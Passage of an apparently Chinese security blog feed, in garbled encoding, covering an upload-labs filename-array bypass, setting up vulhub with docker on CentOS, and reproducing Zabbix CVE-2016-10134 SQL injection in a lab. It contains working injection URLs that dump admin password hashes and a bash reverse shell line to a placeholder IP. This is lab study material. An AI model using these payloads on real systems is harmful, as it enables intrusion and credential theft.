class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <br>            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-comment">#resetå°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒï¼›count()è·å–fileå…ƒç´ ä¸ªæ•°ï¼Œcount($file)-1å³å…ƒç´ ä¸ªæ•°-1</span><br>            <span class="hljs-comment">#å³æ‹¼æ¥ æ–‡ä»¶å(æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒ) + . + æ•°ç»„å€’æ•°ç¬¬äºŒä¸ªå•å…ƒï¼›</span><br>            <br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤ï¼š</p><p>1.æ£€æŸ¥MIMEï¼šä¿®æ”¹Content-Typeå³å¯bypass</p><p>2.æ£€æŸ¥åç¼€åï¼šå°†æ–‡ä»¶ååˆ†å‰²å–æœ«å°¾å…ƒç´ åˆ¤æ–­ï¼Œå› æ­¤æ–‡ä»¶æœ€åä¸€ä¸ªåç¼€å¿…é¡»ä¸º<code>jpg | png | gif</code></p><p>3.é‡æ–°æ‹¼æ¥æ–‡ä»¶åï¼šæ‹¼æ¥ <code>æ–‡ä»¶å(æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒ)</code> + <code>.</code> + <code>æ•°ç»„å€’æ•°ç¬¬äºŒä¸ªå•å…ƒ</code>ï¼›</p><p>è‹¥ä¼ å…¥å€¼ä¸ºéæ•°ç»„åˆ™ç”¨<code>explode(&#39;.&#39;, strtolower($file))</code>åˆ†å‰²ä¸ºæ•°ç»„(ä»¥ . åˆ†å‰²)ï¼Œä¸ºä½¿æ•°ç»„å€¼å¯æ§ï¼Œéœ€ä»¥æ•°ç»„å½¢å¼ä¼ å…¥</p><p>æ§åˆ¶ä¼ å…¥å‚æ•°çš„æ•°ç»„å€¼ï¼š<code>save_name[0]=info.php</code> ; <code>save_name[2]=gif</code>ï¼›ï¼ˆæ­¤å¤„save_name[1]é»˜è®¤ä¸ºç©ºï¼‰</p><p>æ•…æœ€ç»ˆæ‹¼æ¥å¾—åˆ°çš„æ–‡ä»¶åä¸º:save_name[0]=info.php<code>+</code>save_name[1]=null<code>å³å¾—</code>info.php `ï¼Œå®ç°ç»•è¿‡</p><h3 id="bypass-20"><a href="#bypass-20" class="headerlink" title="bypass"></a>bypass</h3><p>å¦‚ä¸‹ï¼šæŠ“åŒ…ä¿®æ”¹å³å¯~</p><p><img src="https://i.loli.net/2021/02/13/JZBYD9wqtifINnT.png"></p><p>æœ€ç»ˆ</p><p><img src="https://i.loli.net/2021/02/13/iKWd4Xn658behPG.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å†™äº†ä¸¤å¤©æ€»ç®—å†™å®Œäº†~è¿‡å¹´ç¬¬ä¸€ç« ï¼</p><p>æ–°å¹´å¿«ä¹â™¥</p>]]></content>
    
    
    <categories>
      
      <category>é¶åœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>æ¸—é€</tag>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»ºvulhub(åŸºäºcentos)</title>
    <link href="/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/"/>
    <url>/2021/02/07/%E6%90%AD%E5%BB%BAvulhub(%E5%9F%BA%E4%BA%8Ecentos)/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰æœ‰æ‰€äº†è§£vulhubï¼Œä½†å› ä¸ºä¸€äº›åŸå› æ²¡æœ‰æ·±å…¥äº†è§£ã€‚å€ŸåŠ©è¿™æ¬¡ä»»åŠ¡å®‰è£…ã€å¤ç°ä¸€ä¸‹æ¼æ´~</p><p>ä½¿ç”¨äº†ï¼šåä¸ºäº‘çš„vpsï¼ˆcentosç³»ç»Ÿï¼‰ã€dockerï¼ˆä½¿ç”¨dockerçš„åŸºæœ¬è¦æ±‚æ˜¯linuxå†…æ ¸åœ¨3.10ä»¥ä¸Šï¼Œå¯ç”¨<code>uname -e</code>æŸ¥çœ‹ï¼‰</p><h1 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h1><p>å®‰è£…è¿‡ç¨‹å‚è€ƒè‡ª<a href="https://www.cnblogs.com/Lee-404/p/12763280.html">Centoså®‰è£…docker+vulhubæ­å»º</a></p><p>vulhubæ¼æ´ç¯å¢ƒæ–‡æ¡£è¯¦æƒ…ï¼š<a href="https://vulhub.org/#/environments/">Vulhub - Docker-Compose file for vulnerability environment</a></p><h2 id="é…ç½®yumæº"><a href="#é…ç½®yumæº" class="headerlink" title="é…ç½®yumæº"></a>é…ç½®yumæº</h2><h3 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ã€€cd /etc/yum.repos.d<br><br>ã€€mkdir repos_bakã€€ã€€#ç”¨æ¥ä¿å­˜å¤‡ä»½æ–‡ä»¶å¤¹<br><br>ã€€mv *.repo repos_bak<br></code></pre></td></tr></table></figure><h3 id="æ·»åŠ æ–°æº"><a href="#æ·»åŠ æ–°æº" class="headerlink" title="æ·»åŠ æ–°æº"></a>æ·»åŠ æ–°æº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ã€€curl -O http://mirrors.aliyun.com/repo/Centos-7.repo#æ­¤å¤„ä¸ºé˜¿é‡Œæº<br>ã€€curl -O http://mirrors.aliyun.com/repo/epel-7.repo<br>ã€€curl -O http://mirrors.aliyun.com/repo/epel-testing.repo<br>ã€€<br>ã€€yum clean all &amp;&amp; yum makecache#é‡å»ºæºç¼“å­˜ã€€<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h2><h3 id="ç¡®ä¿yumçš„åŒ…ä¸ºæœ€æ–°"><a href="#ç¡®ä¿yumçš„åŒ…ä¸ºæœ€æ–°" class="headerlink" title="ç¡®ä¿yumçš„åŒ…ä¸ºæœ€æ–°"></a>ç¡®ä¿yumçš„åŒ…ä¸ºæœ€æ–°</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum update -y<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…åŸºæœ¬é©±åŠ¨ä¾èµ–"><a href="#å®‰è£…åŸºæœ¬é©±åŠ¨ä¾èµ–" class="headerlink" title="å®‰è£…åŸºæœ¬é©±åŠ¨ä¾èµ–"></a>å®‰è£…åŸºæœ¬é©±åŠ¨ä¾èµ–</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y yum-untils device-mapper-persistent-data lvm2<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨é˜¿é‡Œçš„dockeræº"><a href="#ä½¿ç”¨é˜¿é‡Œçš„dockeræº" class="headerlink" title="ä½¿ç”¨é˜¿é‡Œçš„dockeræº"></a>ä½¿ç”¨é˜¿é‡Œçš„dockeræº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoã€€<br><br>yum makecache fast<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…docker-1"><a href="#å®‰è£…docker-1" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h3><p>å®‰è£…é»˜è®¤ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install docker-ce<br></code></pre></td></tr></table></figure><p>æŒ‡å®šç‰ˆæœ¬å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum list docker-ce --showduplicates | sort -rã€€ã€€#æ˜¾ç¤ºdockerç‰ˆæœ¬åˆ—è¡¨<br><br>yum -y install ç‰ˆæœ¬ã€€ã€€#å¦‚ï¼šyum -y install docker-ce-18.03.1.ce-1.el7.centos<br></code></pre></td></tr></table></figure><h3 id="éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸä»¥åŠå¼€æœºè‡ªå¯"><a href="#éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸä»¥åŠå¼€æœºè‡ªå¯" class="headerlink" title="éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸä»¥åŠå¼€æœºè‡ªå¯"></a>éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸä»¥åŠå¼€æœºè‡ªå¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker version#æ˜¾ç¤ºdockerç‰ˆæœ¬<br><br>systemctl start docker#å¯åŠ¨docker~<br>systemctl enable docker#è®¾ç½®å¼€æœºè‡ªå¯<br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®å›½å†…æºï¼ˆåŠ é€Ÿé•œåƒä½¿ç”¨-ï¼‰"><a href="#è®¾ç½®å›½å†…æºï¼ˆåŠ é€Ÿé•œåƒä½¿ç”¨-ï¼‰" class="headerlink" title="è®¾ç½®å›½å†…æºï¼ˆåŠ é€Ÿé•œåƒä½¿ç”¨~ï¼‰"></a>è®¾ç½®å›½å†…æºï¼ˆåŠ é€Ÿé•œåƒä½¿ç”¨~ï¼‰</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/docker/daemon.conf  #å¦‚æœæ²¡æœ‰å°±è‡ªå·±åˆ›å»ºï¼Œç„¶åè¾“å…¥å¦‚ä¸‹å†…å®¹<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;<br> ã€€&quot;registry-mirrors&quot;: [<br>           &quot;https://dockerhub.azk8s.cn&quot;,<br>    ã€€     &quot;https://reg-mirror.qiniu.com&quot;,<br>    ã€€ã€€ã€€ã€€&quot;https://registry.docker-cn.com&quot;,<br>    ã€€ã€€ã€€ã€€&quot;http://hub-mirror.c.163.com&quot;,<br>   ã€€ã€€ã€€ã€€ &quot;https://3laho3y3.mirror.aliyuncs.com&quot;,<br>   ã€€ã€€ã€€ã€€ &quot;http://f1361db2.m.daocloud.io&quot;,<br>   ã€€ã€€ã€€ã€€ &quot;https://mirror.ccs.tencentyun.com&quot;<br> ã€€ã€€ã€€ã€€     ]<br>&#125;        <br></code></pre></td></tr></table></figure><p>vimçš„å°çŸ¥è¯†ï¼š</p><p>ç²˜è´´å®ŒåæŒ‰ä¸€ä¸‹å³ä¸Šè§’çš„<code>esc</code>ï¼Œç„¶åæŒ‰<code>:</code>è¾“å…¥<code>wq</code>å°±å¯ä»¥ä¿å­˜å¹¶é€€å‡ºå•¦~ï¼Œå†åŠ ä¸ª<code>!</code>å°±æ˜¯å¼ºåˆ¶ä¿å­˜å¹¶é€€å‡ºå•¦</p><h3 id="é‡å¯dockerï¼š"><a href="#é‡å¯dockerï¼š" class="headerlink" title="é‡å¯dockerï¼š"></a>é‡å¯dockerï¼š</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br><br>systemctl restart docker<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…docker-composeï¼š"><a href="#å®‰è£…docker-composeï¼š" class="headerlink" title="å®‰è£…docker-composeï¼š"></a>å®‰è£…docker-composeï¼š</h3><p>å®‰è£…å‰è¦å®‰è£…dockerå™¢ï¼Œåœ¨centoså®‰è£…æŒ‡ä»¤å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å³å¯~~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose<br><br>chmod +x /usr/local/bin/docker-compose#æ·»åŠ æ‰§è¡Œæƒé™ï¼<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…vulhub"><a href="#å®‰è£…vulhub" class="headerlink" title="å®‰è£…vulhub"></a>å®‰è£…vulhub</h2><blockquote><p>å®˜æ–¹æ–‡æ¡£ï¼š</p><p>Vulhubæ˜¯ä¸€ä¸ªé¢å‘å¤§ä¼—çš„å¼€æºæ¼æ´é¶åœºï¼Œæ— éœ€dockerçŸ¥è¯†ï¼Œç®€å•æ‰§è¡Œä¸¤æ¡å‘½ä»¤å³å¯ç¼–è¯‘ã€è¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ¼æ´é¶åœºé•œåƒã€‚æ—¨åœ¨è®©æ¼æ´å¤ç°å˜å¾—æ›´åŠ ç®€å•ï¼Œè®©å®‰å…¨ç ”ç©¶è€…æ›´åŠ ä¸“æ³¨äºæ¼æ´åŸç†æœ¬èº«ã€‚</p><p>å®‰è£…<code>docker</code>å’Œ<code>docker-compose</code>åå³å¯å¼€å§‹ä½¿ç”¨vulhubï¼š</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">å®‰è£…gitï¼Œä¸ºäº†åç»­ä»githubæ‹‰å–vulhub</span><br>yum -y install git <br><br><span class="hljs-meta">#</span><span class="bash"> è¿›å…¥æ¼æ´ç®¡ç†ç›®å½•ï¼Œåœ¨æ­¤ä¹‹å‰å¯ä»¥mkdirä¸€ä¸ª~</span><br>cd /<br>mkdir mycve<br>cd mycve<br>git clone https://github.com/vulhub/vulhub.git#æ‹‰å–vulhubåˆ°ç›®å½•mycveä¸­<br><br><span class="hljs-meta">#</span><span class="bash"> ç¼–è¯‘ï¼ˆå¯é€‰ï¼‰</span><br>docker-compose build <br><br><span class="hljs-meta">#</span><span class="bash">è¿›å…¥æƒ³å®‰è£…çš„æ¼æ´ç¯å¢ƒç›®å½•ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯è¿›è¡Œæ­å»º</span> <br>docker-compose up -d <br><br><span class="hljs-meta">#</span><span class="bash">æŸ¥çœ‹æœåŠ¡çš„è¿è¡Œç«¯å£ï¼ŒåŠ ä¸Švpsçš„ipåœ°å€å°±èƒ½è®¿é—®å•¦~</span><br>docker ps<br><br><span class="hljs-meta">#</span><span class="bash">æµ‹è¯•å®Œæ¯•ä¹‹åï¼Œä½¿ç”¨æ­¤å‘½ä»¤å³å¯ç»“æŸæœåŠ¡ï¼Œä½¿ç¯å¢ƒå˜ä¸ºåˆå§‹çŠ¶æ€ã€‚</span><br>docker-compose down <br></code></pre></td></tr></table></figure><h3 id="å…³äºæ¼æ´ç¯å¢ƒæ­å»ºçš„ä¸€äº›è¡¥å……"><a href="#å…³äºæ¼æ´ç¯å¢ƒæ­å»ºçš„ä¸€äº›è¡¥å……" class="headerlink" title="å…³äºæ¼æ´ç¯å¢ƒæ­å»ºçš„ä¸€äº›è¡¥å……"></a>å…³äºæ¼æ´ç¯å¢ƒæ­å»ºçš„ä¸€äº›è¡¥å……</h3><p>vulhubé›†æˆäº†è®¸å¤šæ¼æ´ç¯å¢ƒï¼Œå¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/02/13/Yqo4HjfZFnGBEPi.png" alt="vulhubé›†æˆçš„ç¯å¢ƒ"></p><p>è¿›å…¥æƒ³è¦ä¸‹è½½çš„ç¯å¢ƒ~</p><p><img src="https://i.loli.net/2021/02/13/4pPbWUGdxfKIs7k.png"></p><p>å†è¿›å…¥ç›¸åº”æ¼æ´ç›®å½•ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯è¿›è¡Œæ­å»º </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d <br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å®‰è£…äº†zabbixçš„CVE-2016-10134(SQLæ³¨å…¥æ¼æ´)</p><p>ç„¶åè®¿é—®vpsçš„ip:å¯¹åº”ç«¯å£å³å¯ï¼Œå¦‚ä¸‹~</p><p><img src="https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png"></p><p>å¤ç°å®Œä¹‹åè®°å¾—è¿˜åŸåˆå§‹ç¯å¢ƒå™¢ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose down <br></code></pre></td></tr></table></figure><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>è¿™é‡Œå…ˆéšä¾¿å¤ç°ä¸¤ä¸ªè¿‡è¿‡ç˜¾å§ï¼Œåé¢å†å¦ä½œç›®å½•åˆ†ç»„è®°å½•~</p><h2 id="zabbix-latest-php-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰"><a href="#zabbix-latest-php-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰" class="headerlink" title="zabbix latest.php SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰"></a>zabbix latest.php SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>zabbixæ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œå…¶ç”±serverã€agentã€webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­webæ¨¡å—ç”±PHPç¼–å†™ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚</p><p>zabbix 2.2.x, 3.0.0-3.0.3ç‰ˆæœ¬å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€æˆæƒç™»é™†å³å¯ç™»é™†zabbixç®¡ç†ç³»ç»Ÿ</p><p>Zabbix çš„<code>latest.phpä¸­çš„toggle_ids[]</code>æˆ–<code>jsrpc.phpä¸­çš„profieldx2å‚æ•°</code>å­˜åœ¨sqlæ³¨å…¥ï¼Œé€šè¿‡sqlæ³¨å…¥è·å–ç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼Œè¿›å…¥åå°ï¼Œè¿›è¡Œgetshellæ“ä½œã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><h4 id="latest-phpä¸­çš„toggle-ids"><a href="#latest-phpä¸­çš„toggle-ids" class="headerlink" title="latest.phpä¸­çš„toggle_ids[]"></a>latest.phpä¸­çš„toggle_ids[]</h4><p>éœ€è¦é¶æœºç³»ç»Ÿæœªå…³é—­é»˜è®¤å¼€å¯guestè´¦æˆ·ç™»é™†ï¼Œzabbix é»˜è®¤è´¦æˆ·Adminå¯†ç zabbixï¼ˆå¼±å£ä»¤å°è¯•ä¸€æ³¢~ï¼‰</p><p>ä½¿ç”¨usernameï¼šguestï¼Œpasswordä¸ºç©ºçš„æ¸¸å®¢è´¦æˆ·ç™»é™†</p><p><img src="https://i.loli.net/2021/02/13/f325W7Ja8FOEejr.png"></p><p>ç™»å½•åï¼ŒæŸ¥çœ‹Cookieä¸­çš„<code>zbx_sessionid</code>ï¼Œå¤åˆ¶å16ä½å­—ç¬¦ï¼š</p><p><img src="https://i.loli.net/2021/02/13/xBVOFagXmtnzeru.png"></p><p>å°†è¿™16ä¸ªå­—ç¬¦ä½œä¸ºsidçš„ï¼Œæ„é€ payloadï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://your-ip:8080/latest.php?output=ajax&amp;sid=******************&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids</span>[<span class="hljs-string"></span>]=updatexml(0,concat(0xa,database(),0xa,user()),0)<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/13/8uvI9oCdWnzlmYO.png"></p><h4 id="jsrpc-phpçš„profieldx2å‚æ•°"><a href="#jsrpc-phpçš„profieldx2å‚æ•°" class="headerlink" title="jsrpc.phpçš„profieldx2å‚æ•°"></a>jsrpc.phpçš„profieldx2å‚æ•°</h4><p>ä¹Ÿå¯ä»¥é€šè¿‡jsrpc.phpè§¦å‘ï¼Œä¸”æ— éœ€ç™»é™†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://your-ip:<span class="hljs-number">8080</span>/jsrpc.php?type=<span class="hljs-number">0</span>&amp;mode=<span class="hljs-number">1</span>&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=<span class="hljs-number">17</span>&amp;profileIdx<span class="hljs-number">2</span>=updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0</span>xa,database(),<span class="hljs-number">0</span>xa,user()),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/13/HaBdrgTc81yhO5S.png"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>ç„¶åå°±æ˜¯å¸¸è§„çš„æ³¨å…¥æµç¨‹å•¦ã€‚æ‹¿åˆ°ç®¡ç†å‘˜è´¦æˆ·å¯†ç ~</p><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://yourip:<span class="hljs-number">8080</span>/jsrpc.php?type=<span class="hljs-number">0</span>&amp;mode=<span class="hljs-number">1</span>&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=<span class="hljs-number">17</span>&amp;profileIdx<span class="hljs-number">2</span>=updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,substr((select group_concat(surname,<span class="hljs-number">0</span>x<span class="hljs-number">2</span>a,passwd) from users ),<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/YoTeb7l6DZ5qFnj.png"><br><img src="https://i.loli.net/2021/02/13/pALPrzy957bBg1x.png"></p><p>Administrator</p><p>5fce1b3e34b520afeffb37ce08c7cd66</p><p><img src="https://i.loli.net/2021/02/13/1mDdf2a5tz7LHEJ.png"></p><p>MD5è§£å¯†å³å¾—å¯†ç zabbix</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ç®¡ç†å‘˜è´¦æˆ·ï¼šï¼ˆä¸æ‡‚ä¸ºå•¥ï¼Œç”¨æˆ·åæ˜¯<span class="hljs-keyword">Admin</span>ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜ï¼Ÿï¼‰<br><span class="hljs-keyword">Admin</span><br>zabbix<br></code></pre></td></tr></table></figure><p>ç™»å…¥åå¦‚ä¸‹å›¾ç‚¹å‡»~åœ¨administrationä¸‹çš„scriptsæ·»åŠ å‘½ä»¤</p><p><img src="https://i.loli.net/2021/02/13/lOjT4emRzKL6cqE.png"></p><p>å†™å…¥åå¼¹shellï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/ä½ çš„ip/ä½ çš„ç«¯å£ 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/XpjChdwn92AJL76.png"></p><p>è§¦å‘è„šæœ¬ï¼Œç„¶åNCç›‘å¬å³å¯~</p><p><img src="https://i.loli.net/2021/02/13/Y9XRjwgMPTvnEHl.png"></p><h2 id="Joomla-3-4-5-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-8562ï¼‰"><a href="#Joomla-3-4-5-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-8562ï¼‰" class="headerlink" title="Joomla 3.4.5 ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-8562ï¼‰"></a>Joomla 3.4.5 ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-8562ï¼‰</h2><h3 id="å®‰è£…è¿‡ç¨‹-1"><a href="#å®‰è£…è¿‡ç¨‹-1" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h3><p>è€æ ·å­ï¼Œåªæ˜¯åœ¨ç½‘é¡µé…ç½®è¿‡ç¨‹æ³¨æ„å¡«å…¥å¦‚ä¸‹æ•°æ®</p><p><img src="https://i.loli.net/2021/02/13/mLkDCOvWSzawQ8p.png"></p><h3 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>æœ¬æ¼æ´æ ¹æºæ˜¯PHP5.6.13å‰çš„ç‰ˆæœ¬åœ¨è¯»å–å­˜å‚¨å¥½çš„sessionæ—¶ï¼Œå¦‚æœååºåˆ—åŒ–å‡ºé”™åˆ™ä¼šè·³è¿‡å½“å‰ä¸€æ®µæ•°æ®è€Œå»ååºåˆ—åŒ–ä¸‹ä¸€æ®µæ•°æ®ã€‚è€ŒJoomlaå°†sessionå­˜å‚¨åœ¨Mysqlæ•°æ®åº“ä¸­ï¼Œç¼–ç 